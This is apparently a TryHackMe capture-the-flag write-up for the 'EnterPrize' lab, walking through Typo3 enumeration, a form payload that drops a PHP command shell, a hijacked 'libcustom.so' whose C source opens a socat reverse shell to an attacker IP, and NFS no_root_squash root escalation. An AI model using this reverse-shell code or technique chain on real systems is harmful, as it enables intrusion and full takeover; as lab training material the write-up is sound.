---
title: EnterPrize TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/1.jpeg)

## Scanning
We launch **nmap** to all ports, with script and software version.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/2.png)

## Enumeration
We access the web resource, but there is nothing.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/3.png)

We launch the **nikto** tool and find the file *"composer.json"*, these files usually reveal interesting information.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/4.png)

#### Contents of the file "composer.json"

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/5.png)

It seems that there are leftover files from **CMS Typo3**, I check several paths but I can't find anything.... But maybe it is in another *subdomain* by virtual hosting (vhost).

We launch the **wfuzz** tool in vhost mode:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/6.png)

We add the subdomain to our */etc/hosts file*, access the new site and find the **Typo3 CMS** that we listed information in the previous file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/7.png)

For this CMS I used the **[Typo3Scan](https://github.com/whoot/Typo3Scan)** tool to find vulnerabilities in this cms.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/8.png)

List the control panel:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/9.png)

We enter credentials by guessing, it seems to work, but the site has gone into maintenance mode and we no longer have access to the panel.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/10.png)

We launch **dirsearch**, list several interesting files and folders.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/11.png)

Access the *"/typo3conf"* directory and list the *"LocalConfiguration.old"* file.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/13.png)

#### Part of the content of the "LocalConfiguration.old" file

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/14.png)

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/15.png)

## Exploitation


We list the sections of the site, we find a form from which we could carry out the exploitation.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/17.png)

We follow the instructions in the article and create a payload to generate the file *"m3.php"* and execute commands through it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/18.png)

#### Sending malicious request:

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/19.png)

#### Proof of concept

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/20.png)

#### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/21.png)

We make an enumeration in the only user that has home, we find some files and a binary that seems interesting.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/26.png)


We check the libraries, we see that it calls *"libcustom.so"*, we see that we also have write permissions, so it would make a lot of sense to replace the file with another illegitimate one.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/27.png)

#### Contents of file libcustom.c

```C
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void do_ping(){
    system("/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.62.222:5555", NULL, NULL);
}
```

We see that the configuration file has a symbolic link to a *"test.conf"* file in the folder, this file is not found but we can write it.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/29.png)

We run the **pspy64** tool and we see that every few minutes it executes the binary and with it our reverse shell.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/28.png)

We wait a few minutes, get shell as the user *"john"* and read the user flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/30.png)

## Privilege Escalation
In the previous enumeration, we saw that there is an nfs working internally, but we did not have access with the user *"www-data"*. 
In the evidence we see that it is vulnerable to **"no_root_squash"**, this vulnerability would allow us to be able to run a shared binary on our machine and get the same privileges of its SUID.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/23.png)

Hacemos port forwarding con **chisel** al servicio **NFS**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/31.png)

We authenticate as root, create a malicious binary, compile and give it permissions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/34.png)

Run the binary from the victim's nfs directory and you will become root.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/EnterPrize/35.png)




